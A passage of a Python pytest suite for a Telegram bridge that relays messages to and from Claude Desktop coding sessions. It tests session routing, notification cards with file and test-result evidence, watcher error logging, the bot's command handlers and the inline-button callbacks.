    return SimpleNamespace(message=FakeMessage(text, reply_to=reply_to))


class TestTextRouting:
    @pytest.mark.asyncio
    async def test_ignores_commands_and_empty_text(self, bridge):
        db.set_current_session("sid-1", "/tmp/proj")
        assert await db.try_handle_text_message(_update("/desktop"), None) is False
        assert await db.try_handle_text_message(_update("   "), None) is False

    @pytest.mark.asyncio
    async def test_no_target_means_the_bot_answers_normally(self, bridge):
        # The bridge must not consume a plain message when nothing is targeted,
        # or the bot stops working as an assistant.
        assert await db.try_handle_text_message(_update("what is 2+2?"), None) is False

    @pytest.mark.asyncio
    async def test_does_not_hijack_when_a_session_merely_happens_to_be_running(
        self, bridge, monkeypatch
    ):
        # Regression: routing used to fall back to "the only running session", so
        # every plain message was injected into whatever Claude session was open.
        monkeypatch.setattr(
            db, "list_running_sessions",
            lambda: [{"sid": "abcd1234-x", "cwd": "/tmp/proj", "pid": "1"}],
        )
        assert await db.try_handle_text_message(_update("hello bot"), None) is False
        assert bridge.invocations == []

    @pytest.mark.asyncio
    async def test_routes_to_the_pinned_session(self, bridge):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, [
            bridge.assistant_turn("ready", cwd=cwd),
        ])
        bridge.set_claude_output(stdout="Done — applied the change.")
        db.set_current_session("abcd1234-x", cwd)

        upd = _update("please refactor the parser")
        assert await db.try_handle_text_message(upd, None) is True
        assert "proj" in upd.message.replies[0]
        assert bridge.wait_for_invocation()

        inv = bridge.invocations[0]
        assert "--resume abcd1234-x" in inv
        assert "please refactor the parser" in inv

    @pytest.mark.asyncio
    async def test_routes_a_reply_to_the_session_of_the_card_it_replies_to(self, bridge):
        conn = store._get_conn()
        carded = bridge.make_cwd("carded")
        conn.execute(
            "INSERT INTO bridge_session_messages(message_id,session_id,cwd,created_at)"
            " VALUES(?,?,?,?)",
            (555, "card-session-id", carded, "2026-07-30T00:00:00"),
        )
        conn.commit()
        bridge.write_transcript("card-session-id", carded, [
            bridge.assistant_turn("ready", cwd=carded),
        ])
        bridge.set_claude_output(stdout="ack")
        # A pinned session must lose to an explicit reply target.
        db.set_current_session("other-session", "/tmp/other")

        upd = _update("yes go ahead", reply_to=SimpleNamespace(message_id=555))
        assert await db.try_handle_text_message(upd, None) is True
        assert bridge.wait_for_invocation()
        assert "--resume card-session-id" in bridge.invocations[0]

    @pytest.mark.asyncio
    async def test_a_reply_to_an_unrelated_message_is_not_routed(self, bridge):
        upd = _update("hello", reply_to=SimpleNamespace(message_id=999))
        assert await db.try_handle_text_message(upd, None) is False

    @pytest.mark.asyncio
    async def test_resume_runs_in_the_sessions_true_cwd(self, bridge):
        # `claude --resume` is scoped by cwd; resuming from a stale subdirectory
        # fails with "No conversation found".
        real_cwd = bridge.home / "realproj"
        real_cwd.mkdir()
        bridge.write_transcript("abcd1234-x", str(real_cwd), [
            bridge.assistant_turn("ready", cwd=str(real_cwd)),
        ])
        bridge.set_claude_output(stdout="ok")
        db.set_current_session("abcd1234-x", str(real_cwd / "subdir"))

        assert await db.try_handle_text_message(_update("hi"), None) is True
        assert bridge.wait_for_invocation()
        assert f"cwd: {real_cwd}" in bridge.invocations[0]

    @pytest.mark.asyncio
    async def test_a_busy_session_warns_but_still_sends(self, bridge):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, [
            bridge.assistant_turn("mid-turn", cwd=cwd),
        ])
        bridge.set_claude_output(stdout="ok")
        db.set_current_session("abcd1234-x", cwd)

        upd = _update("another message")
        assert await db.try_handle_text_message(upd, None) is True
        assert "queue" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_the_reply_lands_as_a_digest_card(self, bridge):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, [
            bridge.assistant_turn("ready", cwd=cwd),
        ])
        bridge.set_claude_output(stdout="DONE\nApplied the refactor.")
        db.set_current_session("abcd1234-x", cwd)

        await db.try_handle_text_message(_update("do it"), None)
        assert bridge.wait_for_text("Reply from")


class TestResumeRunner:
    def test_stderr_is_reported_when_there_is_no_stdout(self, bridge, no_summarizer):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, [
            bridge.assistant_turn("ready", cwd=cwd),
        ])
        bridge.set_claude_output(stderr="No conversation found", exit_code=1)
        db._run_resume_background("abcd1234-x", cwd, "hello")
        assert bridge.wait_for_text("No conversation found")

    def test_the_resume_is_guarded_against_its_own_stop_hook(self, bridge, no_summarizer):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, [
            bridge.assistant_turn("ready", cwd=cwd),
        ])
        bridge.set_claude_output(stdout="fine")
        db._run_resume_background("abcd1234-x", cwd, "hello")
        assert bridge.wait_for_invocation()
        # Otherwise the resumed session's Stop hook posts a second, redundant card.
        assert "internal: 1" in bridge.invocations[0]


# ══════════════════════════════════════════════════════════════════════════════
# 6. hook_notify — the card the whole feature hangs off
# ══════════════════════════════════════════════════════════════════════════════


class TestNotifyHook:
    def test_a_stop_card_includes_the_last_assistant_message(self, bridge, no_summarizer):
        bridge.write_transcript("abcd1234-session", "/tmp/proj", [
            bridge.assistant_turn("Finished the migration.", cwd="/tmp/proj"),
        ])
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        assert any("Finished the migration." in t for t in bridge.tg.texts)

    def test_the_card_is_recorded_so_replies_can_be_routed_back(self, bridge, no_summarizer):
        bridge.write_transcript("abcd1234-session", "/tmp/proj", [
            bridge.assistant_turn("done", cwd="/tmp/proj"),
        ])
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        conn = store._get_conn()
        row = conn.execute(
            "SELECT session_id, cwd FROM bridge_session_messages"
        ).fetchone()
        assert tuple(row) == ("abcd1234-session", "/tmp/proj")

    def test_a_failed_send_records_nothing(self, bridge, no_summarizer):
        bridge.write_transcript("abcd1234-session", "/tmp/proj", [
            bridge.assistant_turn("done", cwd="/tmp/proj"),
        ])
        bridge.tg.fail_all = True
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        conn = store._get_conn()
        # A row whose message_id doesn't exist would route replies nowhere.
        assert conn.execute("SELECT COUNT(*) FROM bridge_session_messages").fetchone()[0] == 0

    def test_a_notification_event_carries_its_message(self, bridge, no_summarizer):
        db.hook_notify("Notification", {
            "session_id": "abcd1234-session", "cwd": "/tmp/proj",
            "message": "Claude needs your permission to use Bash",
        })
        assert any("permission to use Bash" in t for t in bridge.tg.texts)

    def test_a_short_body_gets_a_use_session_button(self, bridge, no_summarizer):
        db.hook_notify("Notification", {
            "session_id": "abcd1234-session", "cwd": "/tmp/proj", "message": "brief",
        })
        assert "bridge:use:abcd1234" in bridge.tg.callback_data()

    def test_the_project_name_and_short_id_head_the_card(self, bridge, no_summarizer):
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/myproject"})
        assert any("myproject" in t and "abcd1234" in t for t in bridge.tg.texts)

    def test_a_session_with_no_cwd_gets_no_session_buttons(self, bridge, no_summarizer):
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": ""})
        # Nothing to resume into, so offering "Use this session" would dead-end.
        assert bridge.tg.callback_data() == []


# ══════════════════════════════════════════════════════════════════════════════
# 6b. Evidence on the card
#
# The card used to carry only what the assistant *said*. These assert that what
# it *did* — files, tests, failures — reaches the phone too, on every route a
# card can take: digested, undigested, and short-body.
# ══════════════════════════════════════════════════════════════════════════════


def _working_turn(cwd: str) -> list[dict]:
    """A turn that edited a file and ran a suite that went red."""
    return [
        {"type": "user", "message": {"content": [{"type": "text", "text": "fix it"}]}},
        {"type": "assistant", "cwd": cwd, "message": {"content": [
            {"type": "tool_use", "id": "e1", "name": "Edit",
             "input": {"file_path": f"{cwd}/auth_flow.py"}},
        ]}},
        {"type": "user",
         "toolUseResult": {"structuredPatch": [{"lines": ["+new", "+more", "-old"]}]},
         "message": {"content": [
             {"type": "tool_result", "tool_use_id": "e1", "content": "ok"}]}},
        {"type": "assistant", "cwd": cwd, "message": {"content": [
            {"type": "tool_use", "id": "b1", "name": "Bash",
             "input": {"command": "pytest -q"}},
        ]}},
        {"type": "user",
         "toolUseResult": {"stdout": "3 failed, 125 passed in 2.10s", "stderr": ""},
         "message": {"content": [
             {"type": "tool_result", "tool_use_id": "b1", "content": "…"}]}},
        {"type": "assistant", "cwd": cwd, "message": {"content": [
            {"type": "text", "text": "Reworked the refresh path."},
        ]}},
    ]


class TestCardEvidence:
    def test_a_stop_card_names_the_files_and_the_suite(self, bridge, no_summarizer):
        bridge.write_transcript("abcd1234-session", "/tmp/proj", _working_turn("/tmp/proj"))
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        blob = "\n".join(bridge.tg.texts)
        assert "auth_flow.py" in blob        # and not mangled to "auth flow.py"
        assert "+2" in blob and "−1" in blob
        assert "3 failed" in blob and "125 passed" in blob

    def test_evidence_survives_the_no_digest_fallback(self, bridge, no_summarizer):
        """The fallback chunker runs the body through _md(), which would eat the
        block's backticks and asterisks — so it is posted on its own."""
        long_turn = _working_turn("/tmp/proj")
        long_turn[-1]["message"]["content"][0]["text"] = "x " * 200
        bridge.write_transcript("abcd1234-session", "/tmp/proj", long_turn)
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        assert any("`auth_flow.py`" in t for t in bridge.tg.texts)

    def test_evidence_reaches_the_digested_card(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "_summarize", lambda raw: "DONE\nReworked the refresh path.")
        long_turn = _working_turn("/tmp/proj")
        long_turn[-1]["message"]["content"][0]["text"] = "x " * 200
        bridge.write_transcript("abcd1234-session", "/tmp/proj", long_turn)
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        card = bridge.tg.texts[0]
        # Prose from the model, facts from the transcript, in that order.
        assert card.index("Reworked") < card.index("auth_flow.py")
        assert "3 failed" in card

    def test_a_short_body_still_carries_evidence(self, bridge, no_summarizer):
        """'Done.' plus three files and a red suite is actionable. 'Done.' is not."""
        turn = _working_turn("/tmp/proj")
        turn[-1]["message"]["content"][0]["text"] = "Done."
        bridge.write_transcript("abcd1234-session", "/tmp/proj", turn)
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        assert any("auth_flow.py" in t and "Done." in t for t in bridge.tg.texts)

    def test_a_notification_card_has_no_evidence_block(self, bridge, no_summarizer):
        """A permission prompt is not finished work — there is no turn to describe."""
        bridge.write_transcript("abcd1234-session", "/tmp/proj", _working_turn("/tmp/proj"))
        db.hook_notify("Notification", {
            "session_id": "abcd1234-session", "cwd": "/tmp/proj", "message": "needs Bash",
        })
        assert not any("auth_flow.py" in t for t in bridge.tg.texts)

    def test_an_unreadable_transcript_costs_the_block_not_the_card(self, bridge, monkeypatch):
        """This runs inside a Stop hook: no evidence is a far smaller failure
        than no notification."""
        monkeypatch.setattr(db, "_summarize", lambda raw: None)
        monkeypatch.setattr(
            "telechat_pkg.bridge_evidence.collect_evidence",
            lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")),
        )
        bridge.write_transcript("abcd1234-session", "/tmp/proj", [
            bridge.assistant_turn("Finished the migration.", cwd="/tmp/proj"),
        ])
        db.hook_notify("Stop", {"session_id": "abcd1234-session", "cwd": "/tmp/proj"})
        assert any("Finished the migration." in t for t in bridge.tg.texts)

    def test_a_reply_from_a_resume_shows_what_it_changed(self, bridge, no_summarizer):
        cwd = bridge.make_cwd("proj")
        bridge.write_transcript("abcd1234-x", cwd, _working_turn(cwd))
        bridge.set_claude_output(stdout="Reworked it.")
        db._run_resume_background("abcd1234-x", cwd, "please fix")
        assert bridge.wait_for_text("auth_flow.py")


# ══════════════════════════════════════════════════════════════════════════════
# 7. The background watcher
#
# It runs on a daemon thread and used to swallow every exception silently, so a
# watcher failing on every pass looked exactly like a quiet one: no session
# pings, no /follow mirroring, nothing in the log to say why.
# ══════════════════════════════════════════════════════════════════════════════


class TestWatcherLoop:
    """`_watch_once` is one pass of the daemon-thread loop, factored out so it
    can be driven directly — patching `time.sleep` to escape the real loop
    patches it for everything else in the process, including test teardown."""

    @pytest.fixture(autouse=True)
    def _reset_counter(self):
        db._watch_failures = 0
        yield
        db._watch_failures = 0

    @staticmethod
    def _run_passes(monkeypatch, n: int, lifecycle=None, follows=None):
        monkeypatch.setattr(db, "_watch_lifecycle", lifecycle or (lambda: None))
        monkeypatch.setattr(db, "_watch_follows", follows or (lambda: None))
        return [db._watch_once() for _ in range(n)]

    def test_a_failing_watch_does_not_stop_the_loop(self, bridge, monkeypatch):
        # The property that mattered before and still matters: one bad read
        # must not end the watcher for the life of the process.
        calls = {"n": 0}

        def always_fails():
            calls["n"] += 1
            raise RuntimeError("transcript vanished")

        results = self._run_passes(monkeypatch, 3, lifecycle=always_fails)
        assert results == [False, False, False]   # reported, never raised
        assert calls["n"] == 3

    def test_the_first_failure_is_reported(self, bridge, monkeypatch, caplog):
        def always_fails():
            raise RuntimeError("boom")

        with caplog.at_level(logging.WARNING, logger="telechat_pkg.desktop_bridge"):
            self._run_passes(monkeypatch, 1, lifecycle=always_fails)
        assert any("lifecycle" in r.message for r in caplog.records)

    def test_repeat_failures_do_not_flood_the_log(self, bridge, monkeypatch, caplog):
        # At a 4-second poll, warning on every pass is ~900 lines an hour.
        def always_fails():
            raise RuntimeError("boom")

        with caplog.at_level(logging.WARNING, logger="telechat_pkg.desktop_bridge"):
            self._run_passes(monkeypatch, 5, lifecycle=always_fails)
        warnings = [r for r in caplog.records if r.levelno == logging.WARNING]
        assert len(warnings) == 1

    def test_a_persistently_broken_watcher_escalates(self, bridge, monkeypatch, caplog):
        def always_fails():
            raise RuntimeError("boom")

        with caplog.at_level(logging.DEBUG, logger="telechat_pkg.desktop_bridge"):
            self._run_passes(monkeypatch, 10, lifecycle=always_fails)
        errors = [r for r in caplog.records if r.levelno >= logging.ERROR]
        assert errors, "10 consecutive failed passes should escalate past debug"
        assert "not working" in errors[0].message

    def test_recovery_resets_the_failure_count(self, bridge, monkeypatch, caplog):
        state = {"pass": 0}

        def fails_once():
            state["pass"] += 1
            if state["pass"] == 1:
                raise RuntimeError("boom")

        with caplog.at_level(logging.DEBUG, logger="telechat_pkg.desktop_bridge"):
            results = self._run_passes(monkeypatch, 12, lifecycle=fails_once)
        assert results[0] is False and all(results[1:])
        # One failure then recovery must never reach the escalation threshold.
        assert not [r for r in caplog.records if r.levelno >= logging.ERROR]

    def test_both_watches_run_even_when_the_first_fails(self, bridge, monkeypatch):
        # They used to be independent try blocks; keep that property.
        followed = {"n": 0}

        def failing_lifecycle():
            raise RuntimeError("boom")

        def counting_follows():
            followed["n"] += 1

        self._run_passes(monkeypatch, 3, lifecycle=failing_lifecycle,
                         follows=counting_follows)
        assert followed["n"] == 3

    def test_a_clean_pass_reports_success(self, bridge, monkeypatch):
        assert self._run_passes(monkeypatch, 2) == [True, True]


# ══════════════════════════════════════════════════════════════════════════════
# 8. Telegram command handlers
#
# Half of desktop_bridge.py is the commands the user actually types, and none of
# them were exercised — the module sat at 47% while five queued tickets
# (0023–0027) all extend exactly this surface. These cover the state each
# command reads and writes, and what it tells the user when there is nothing to
# act on, which is the case every one of them gets wrong most easily.
# ══════════════════════════════════════════════════════════════════════════════


def _ctx(*args) -> SimpleNamespace:
    return SimpleNamespace(args=list(args))


def _card(bridge, sid: str, cwd: str, message_id: int = 500) -> None:
    """Record a session card, which is how the bridge learns a session exists."""
    conn = store._get_conn()
    conn.execute(
        "INSERT OR REPLACE INTO bridge_session_messages(message_id,session_id,cwd,created_at)"
        " VALUES(?,?,?,?)",
        (message_id, sid, cwd, "2026-07-31T00:00:00"),
    )
    conn.commit()


class TestCurrentSessionCommands:
    @pytest.mark.asyncio
    async def test_use_without_an_argument_explains_itself(self, bridge):
        upd = _update("/desktop_use")
        await db.cmd_desktop_use(upd, _ctx())
        assert "Usage" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_use_resolves_a_short_id_and_sets_the_current_session(self, bridge):
        cwd = bridge.make_cwd("alpha")
        _card(bridge, "abcd1234-full-id", cwd)
        upd = _update("/desktop_use abcd1234")
        await db.cmd_desktop_use(upd, _ctx("abcd1234"))
        assert db.get_current_session() == ("abcd1234-full-id", cwd)
        assert "alpha" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_use_with_an_unknown_id_says_so_and_changes_nothing(self, bridge):
        upd = _update("/desktop_use zzzzzzzz")
        await db.cmd_desktop_use(upd, _ctx("zzzzzzzz"))
        assert "No session matches" in upd.message.replies[0]
        assert db.get_current_session() == (None, None)

    @pytest.mark.asyncio
    async def test_which_reports_the_current_session(self, bridge):
        cwd = bridge.make_cwd("beta")
        db.set_current_session("abcd1234-x", cwd)
        upd = _update("/desktop_which")
        await db.cmd_desktop_which(upd, _ctx())
        assert "beta" in upd.message.replies[0]
        assert "abcd1234" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_which_with_nothing_set_points_at_the_picker(self, bridge):
        upd = _update("/desktop_which")
        await db.cmd_desktop_which(upd, _ctx())
        assert "/desktop" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_clear_forgets_the_current_session(self, bridge):
        db.set_current_session("abcd1234-x", bridge.make_cwd("gamma"))
        upd = _update("/desktop_clear")
        await db.cmd_desktop_clear(upd, _ctx())
        assert db.get_current_session() == (None, None)
        assert "Cleared" in upd.message.replies[0]


class TestPanels:
    @pytest.mark.asyncio
    async def test_the_sessions_panel_says_when_nothing_is_running(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        upd = _update("/desktop")
        await db.cmd_desktop(upd, _ctx())
        assert "No Claude Desktop sessions running" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_the_sessions_panel_lists_a_running_session(self, bridge, monkeypatch):
        cwd = bridge.make_cwd("delta")
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "abcd1234-x", "cwd": cwd, "etime": "01:23", "pid": "42", "model": "sonnet"},
        ])
        upd = _update("/desktop")
        await db.cmd_desktop(upd, _ctx())
        text = upd.message.replies[0]
        assert "delta" in text and "abcd1234" in text

    @pytest.mark.asyncio
    async def test_the_panel_marks_which_session_is_current(self, bridge, monkeypatch):
        cwd = bridge.make_cwd("eps")
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "abcd1234-x", "cwd": cwd, "etime": "01:23", "pid": "42", "model": "sonnet"},
        ])
        db.set_current_session("abcd1234-x", cwd)
        text, _markup = db._build_sessions_panel()
        assert "← current" in text

    @pytest.mark.asyncio
    async def test_a_session_with_no_id_yet_is_shown_but_not_offered(self, bridge, monkeypatch):
        # A freshly started Desktop session has no --resume id; it can be
        # reported but there is nothing to switch to.
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "", "cwd": "", "etime": "00:05", "pid": "77", "model": "sonnet"},
        ])
        text, markup = db._build_sessions_panel()
        assert "no id yet" in text
        buttons = [b.callback_data for row in markup.inline_keyboard for b in row]
        assert not any(b.startswith("bridge:use:") and b != "bridge:use:clear"
                       for b in buttons)

    @pytest.mark.asyncio
    async def test_the_recent_panel_says_when_there_is_nothing(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_recent_sessions", lambda limit=8: [])
        upd = _update("/recent")
        await db.cmd_desktop_recent(upd, _ctx())
        assert "No Claude sessions found" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_the_recent_panel_offers_each_session_for_resume(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_recent_sessions", lambda limit=8: [
            {"sid": "abcd1234-x", "cwd": "/tmp/zeta", "ago": "5m ago",
             "running": False, "last": "did the thing", "mtime": 0},
        ])
        text, markup = db._build_recent_panel()
        assert "zeta" in text and "5m ago" in text
        buttons = [b.callback_data for row in markup.inline_keyboard for b in row]
        assert "bridge:use:abcd1234" in buttons


class TestBroadcast:
    @pytest.mark.asyncio
    async def test_broadcast_without_a_message_explains_itself(self, bridge):
        upd = _update("/desktop_all")
        await db.cmd_desktop_all(upd, _ctx())
        assert "Usage" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_broadcast_with_no_sessions_says_so(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        upd = _update("/desktop_all hello")
        await db.cmd_desktop_all(upd, _ctx("hello"))
        assert "No interactable sessions" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_broadcast_reaches_every_interactable_session(self, bridge, monkeypatch):
        sent = []
        monkeypatch.setattr(db, "_run_resume_background",
                            lambda sid, cwd, msg: sent.append((sid, msg)))
        monkeypatch.setattr(db, "list_running_sessions", lambda: [
            {"sid": "aaaa1111", "cwd": "/tmp/one", "etime": "1", "pid": "1", "model": "sonnet"},
            {"sid": "bbbb2222", "cwd": "/tmp/two", "etime": "1", "pid": "2", "model": "sonnet"},
            {"sid": "", "cwd": "", "etime": "1", "pid": "3", "model": "sonnet"},  # no id
        ])
        upd = _update("/desktop_all status?")
        await db.cmd_desktop_all(upd, _ctx("status?"))
        assert sent == [("aaaa1111", "status?"), ("bbbb2222", "status?")]
        assert "2" in upd.message.replies[0]


class TestApprovalToggles:
    @pytest.mark.asyncio
    async def test_global_approval_on_covers_projects_never_configured(self, bridge):
        upd = _update("/approve_all_on")
        await db.cmd_approve_all_on(upd, _ctx())
        assert db.approve_mode_on("/never/seen/before") is True

    @pytest.mark.asyncio
    async def test_global_approval_off_restores_per_project_settings(self, bridge):
        db.set_approve_mode("/tmp/proj", True)
        await db.cmd_approve_all_on(_update("/approve_all_on"), _ctx())
        await db.cmd_approve_all_off(_update("/approve_all_off"), _ctx())
        assert db.approve_mode_on("/never/seen/before") is False
        assert db.approve_mode_on("/tmp/proj") is True

    @pytest.mark.asyncio
    async def test_arming_approval_needs_a_card_to_reply_to(self, bridge):
        upd = _update("/desktop_approve_on")
        await db.cmd_desktop_approve_on(upd, _ctx())
        assert "Reply to a session card" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_replying_to_a_card_arms_that_project(self, bridge):
        cwd = bridge.make_cwd("armed")
        _card(bridge, "abcd1234-x", cwd, message_id=777)
        upd = _update("/desktop_approve_on",
                      reply_to=SimpleNamespace(message_id=777))
        await db.cmd_desktop_approve_on(upd, _ctx())
        assert db.approve_mode_on(cwd) is True


class TestLifecycleToggle:
    @pytest.mark.asyncio
    async def test_pings_are_on_by_default(self, bridge):
        assert db.lifecycle_on() is True

    @pytest.mark.asyncio
    async def test_off_then_on_round_trips(self, bridge):
        await db.cmd_lifecycle(_update("/lifecycle off"), _ctx("off"))
        assert db.lifecycle_on() is False
        await db.cmd_lifecycle(_update("/lifecycle on"), _ctx("on"))
        assert db.lifecycle_on() is True

    @pytest.mark.asyncio
    async def test_no_argument_reports_without_changing(self, bridge):
        await db.cmd_lifecycle(_update("/lifecycle off"), _ctx("off"))
        upd = _update("/lifecycle")
        await db.cmd_lifecycle(upd, _ctx())
        assert "OFF" in upd.message.replies[0]
        assert db.lifecycle_on() is False

    @pytest.mark.asyncio
    async def test_an_unrecognised_argument_does_not_toggle(self, bridge):
        upd = _update("/lifecycle maybe")
        await db.cmd_lifecycle(upd, _ctx("maybe"))
        assert db.lifecycle_on() is True


class TestFollowMode:
    @pytest.mark.asyncio
    async def test_follow_needs_a_session(self, bridge):
        upd = _update("/follow")
        await db.cmd_follow(upd, _ctx())
        assert "Usage" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_follow_uses_the_current_session_when_given_no_id(self, bridge):
        cwd = bridge.make_cwd("followed")
        bridge.write_transcript("abcd1234-x", cwd, [bridge.assistant_turn("hi", cwd=cwd)])
        db.set_current_session("abcd1234-x", cwd)
        upd = _update("/follow")
        await db.cmd_follow(upd, _ctx())
        assert [f[0] for f in db.list_follows()] == ["abcd1234-x"]
        assert "Following" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_follow_starts_at_the_end_of_the_transcript(self, bridge):
        # Following must stream what happens *next*, not replay the backlog.
        cwd = bridge.make_cwd("tail")
        path = bridge.write_transcript(
            "abcd1234-x", cwd, [bridge.assistant_turn("old news", cwd=cwd)]
        )
        _card(bridge, "abcd1234-x", cwd)
        await db.cmd_follow(_update("/follow abcd1234"), _ctx("abcd1234"))
        _sid, _cwd, last_pos = db.list_follows()[0]
        assert last_pos == path.stat().st_size

    @pytest.mark.asyncio
    async def test_following_lists_what_is_being_followed(self, bridge):
        db.follow_add("abcd1234-x", "/tmp/one", 0)
        upd = _update("/following")
        await db.cmd_following(upd, _ctx())
        assert "abcd1234" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_following_nothing_says_how_to_start(self, bridge):
        upd = _update("/following")
        await db.cmd_following(upd, _ctx())
        assert "/follow" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_unfollow_by_short_id(self, bridge):
        db.follow_add("abcd1234-x", "/tmp/one", 0)
        db.follow_add("eeee5678-y", "/tmp/two", 0)
        await db.cmd_unfollow(_update("/unfollow abcd1234"), _ctx("abcd1234"))
        assert [f[0] for f in db.list_follows()] == ["eeee5678-y"]

    @pytest.mark.asyncio
    async def test_unfollow_with_no_argument_unfollows_everything(self, bridge):
        db.follow_add("abcd1234-x", "/tmp/one", 0)
        db.follow_add("eeee5678-y", "/tmp/two", 0)
        upd = _update("/unfollow")
        await db.cmd_unfollow(upd, _ctx())
        assert db.list_follows() == []
        assert "2" in upd.message.replies[0]

    @pytest.mark.asyncio
    async def test_unfollowing_something_not_followed_says_so(self, bridge):
        upd = _update("/unfollow zzzzzzzz")
        await db.cmd_unfollow(upd, _ctx("zzzzzzzz"))
        assert "Not following" in upd.message.replies[0]


class TestShortIdResolution:
    def test_a_short_id_resolves_through_a_recorded_card(self, bridge):
        cwd = bridge.make_cwd("resolved")
        _card(bridge, "abcd1234-long-session-id", cwd)
        assert db.resolve_short_session("abcd1234") == ("abcd1234-long-session-id", cwd)

    def test_resolution_falls_back_to_the_transcript_on_disk(self, bridge):
        # A session telechat never posted a card for is still resumable — that
        # is the difference between /recent being useful and being a listing.
        cwd = bridge.make_cwd("ondisk")
        bridge.write_transcript("ffff9999-x", cwd, [bridge.assistant_turn("hi", cwd=cwd)])
        assert db.resolve_short_session("ffff9999") == ("ffff9999-x", cwd)

    def test_an_empty_short_id_resolves_to_nothing(self, bridge):
        assert db.resolve_short_session("") is None
        assert db.resolve_short_session("   ") is None

    def test_the_newest_card_wins_for_an_ambiguous_prefix(self, bridge):
        old_cwd = bridge.make_cwd("older")
        new_cwd = bridge.make_cwd("newer")
        conn = store._get_conn()
        for mid, cwd, created in ((1, old_cwd, "2026-07-01T00:00:00"),
                                  (2, new_cwd, "2026-07-30T00:00:00")):
            conn.execute(
                "INSERT OR REPLACE INTO bridge_session_messages"
                "(message_id,session_id,cwd,created_at) VALUES(?,?,?,?)",
                (mid, f"abcd1234-{mid}", cwd, created),
            )
        conn.commit()
        assert db.resolve_short_session("abcd1234")[1] == new_cwd


# ══════════════════════════════════════════════════════════════════════════════
# 9. Inline-button callbacks
#
# Every card the bridge posts carries buttons, and the callback router that
# backs them was untested — including the approve/deny path, which is the one
# place a wrong answer has consequences.
# ══════════════════════════════════════════════════════════════════════════════


class FakeCallbackQuery:
    def __init__(self, data: str, chat_id: int = 424242):
        self.data = data
        self.answers: list[str] = []
        self.edits: list[str] = []
        self.markup_edits = 0
        self.message = SimpleNamespace(chat_id=chat_id, message_id=1)

    async def answer(self, text: str = "", **_kwargs):
        self.answers.append(text)

    async def edit_message_text(self, text, **_kwargs):
        self.edits.append(text)

    async def edit_message_reply_markup(self, **_kwargs):
        self.markup_edits += 1


class FakeBot:
    def __init__(self):
        self.sent: list[str] = []

    async def send_message(self, chat_id=None, text="", **_kwargs):
        self.sent.append(text)


def _callback(data: str):
    q = FakeCallbackQuery(data)
    bot = FakeBot()
    return SimpleNamespace(callback_query=q), SimpleNamespace(bot=bot), q, bot


class TestCallbackRouting:
    @pytest.mark.asyncio
    async def test_a_non_bridge_callback_is_left_alone(self, bridge):
        upd, ctx, _q, _bot = _callback("tg:something:else")
        assert await db.try_handle_callback(upd, ctx) is False

    @pytest.mark.asyncio
    async def test_use_switches_the_current_session(self, bridge):
        cwd = bridge.make_cwd("switched")
        _card(bridge, "abcd1234-x", cwd)
        upd, ctx, q, bot = _callback("bridge:use:abcd1234")
        assert await db.try_handle_callback(upd, ctx) is True
        assert db.get_current_session() == ("abcd1234-x", cwd)
        assert "switched" in bot.sent[0]
        assert q.answers

    @pytest.mark.asyncio
    async def test_use_clear_forgets_the_session(self, bridge):
        db.set_current_session("abcd1234-x", bridge.make_cwd("x"))
        upd, ctx, _q, bot = _callback("bridge:use:clear")
        await db.try_handle_callback(upd, ctx)
        assert db.get_current_session() == (None, None)
        assert "Cleared" in bot.sent[0]

    @pytest.mark.asyncio
    async def test_use_with_an_unknown_id_answers_rather_than_failing(self, bridge):
        upd, ctx, q, bot = _callback("bridge:use:zzzzzzzz")
        assert await db.try_handle_callback(upd, ctx) is True
        assert "not found" in q.answers[0].lower()
        assert bot.sent == []

    @pytest.mark.asyncio
    async def test_refresh_rerenders_the_panel(self, bridge, monkeypatch):
        monkeypatch.setattr(db, "list_running_sessions", lambda: [])
        upd, ctx, q, _bot = _callback("bridge:refresh")
        assert await db.try_handle_callback(upd, ctx) is True
        assert q.edits and "No Claude Desktop sessions" in q.edits[0]

    @pytest.mark.asyncio
    async def test_an_unchanged_panel_refresh_does_not_raise(self, bridge, monkeypatch):
        # Telegram rejects an edit whose content is identical, which is the
        # normal case for a refresh that changed nothing.
